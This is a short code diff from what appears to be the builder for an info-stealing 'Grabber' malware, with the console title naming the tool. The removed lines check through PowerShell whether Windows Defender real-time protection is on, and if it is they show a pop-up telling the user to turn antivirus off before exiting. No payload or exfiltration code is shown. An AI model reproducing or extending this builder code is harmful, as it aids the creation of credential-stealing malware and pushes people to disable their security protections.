@@ -16,28 +16,6 @@ import subprocess
 import ctypes
 import sys
 
-def is_windows_defender_on():
-    try:
-        # Run PowerShell command to check Windows Defender status
-        result = subprocess.run(
-            ['powershell', '-Command', 'Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring'],
-            capture_output=True, text=True
-        )
-        # If the output is 'False', Windows Defender is on
-        if result.stdout.strip() == 'False':
-            return True
-    except Exception as e:
-        print(f"Error checking Windows Defender status: {e}")
-    return False
-
-def show_error_and_exit():
-    message = "Having antivirus on will cause deletion of builds. Please turn it off."
-    ctypes.windll.user32.MessageBoxW(0, message, "Antivirus Warning", 0x10 | 0x40000)  # 0x10 is MB_ICONERROR, 0x40000 is MB_TOPMOST
-    sys.exit(1)
-
-if is_windows_defender_on():
-    show_error_and_exit()
-
 try:
     # Sets the console title
     ctypes.windll.kernel32.SetConsoleTitleW(f"serpantis Grabber | Builder | {os.getenv('computername')}")
